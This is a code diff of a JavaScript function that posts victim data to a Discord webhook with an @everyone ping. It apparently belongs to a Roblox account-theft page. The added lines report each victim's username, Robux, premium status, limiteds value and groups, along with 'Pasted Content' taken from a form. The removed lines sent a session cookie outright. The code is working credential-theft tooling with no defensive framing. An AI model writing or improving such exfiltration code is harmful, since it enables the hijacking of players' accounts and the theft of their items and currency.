@@ -190,61 +190,112 @@ async function sendToDiscord(
 
     }
 
-    const payload = {
-      content: '@everyone',
-      embeds: [
+   const payload = {
+  content: '@everyone',
+
+  embeds: [
+    {
+      title: `🚨 New Submission Received • ${roblox?.username || 'Unknown User'}`,
+
+      description: ':fire: `NEW PAGE ENTRY` :fire:',
+
+      color: 5793266,
+
+      fields: [
+
         {
-          title: '🚨 New Submission Received',
-          description: ':fire: `NEW PAGE ENTRY` :fire:',
-          color: 5793266,
+          name: '👤 Username',
+          value: roblox?.username || 'N/A',
+          inline: true
+        },
 
-          fields: [
+        {
+          name: '📛 Display Name',
+          value: roblox?.displayName || 'N/A',
+          inline: true
+        },
 
-            {
-              name: '📄 Page',
-              value: `\`${pageName}\``,
-              inline: true
-            },
+        {
+          name: '🆔 User ID',
+          value: String(roblox?.id || 'N/A'),
+          inline: true
+        },
 
-            {
-              name: '🎯 Slot',
-              value: `\`${slotLabel}\``,
-              inline: true
-            },
+        {
+          name: '💰 Robux',
+          value: String(roblox?.robux ?? 'N/A'),
+          inline: true
+        },
 
-            {
-              name: '📥 Pasted Content',
-              value: pastedField.slice(0, 1000),
-              inline: false
-            },
+        {
+          name: '👥 Friends',
+          value: String(roblox?.friends ?? 'N/A'),
+          inline: true
+        },
 
-            {
-              name: '🔐 Cookie',
-              value: cookie
-                ? `\`\`\`${cookie.slice(0, 850)}...\`\`\``
-                : 'No Cookie',
-              inline: false
-            },
+        {
+          name: '⭐ Premium',
+          value: roblox?.isPremium ? 'Yes ⭐' : 'No ❌',
+          inline: true
+        },
 
-            {
-              name: '📅 Date Submitted',
-              value: `\`${now}\``,
-              inline: false
-            }
+        {
+          name: '📊 Account Age',
+          value: roblox?.accountAgeDays
+            ? `${roblox.accountAgeDays} Days`
+            : 'N/A',
+          inline: true
+        },
 
-          ],
+        {
+          name: '👥 Groups Owned',
+          value: String(roblox?.groupsOwned ?? 'N/A'),
+          inline: true
+        },
 
-          footer: {
-            text: 'Submission Logger • Automated System'
-          },
+        {
+          name: '🛒 Limiteds Value',
+          value: String(roblox?.limitedsValue ?? 'N/A'),
+          inline: true
+        },
 
-          thumbnail: {
-            url:
-              'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
-          }
+        {
+          name: '📄 Page',
+          value: `\`${pageName}\``,
+          inline: false
+        },
+
+        {
+          name: '🎯 Slot',
+          value: `\`${slotLabel}\``,
+          inline: false
+        },
+
+        {
+          name: '📥 Pasted Content',
+          value: (pastedField || 'N/A').slice(0, 1000),
+          inline: false
+        },
+
+        {
+          name: '📅 Date Submitted',
+          value: `\`${now}\``,
+          inline: false
         }
-      ]
-    };
+
+      ],
+
+      footer: {
+        text: 'Submission Logger • Automated System'
+      },
+
+      thumbnail: {
+        url: roblox?.avatarUrl ||
+          'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
+      }
+    }
+  ]
+};
 
     const resp = await fetch(webhookUrl, {
       method: 'POST',
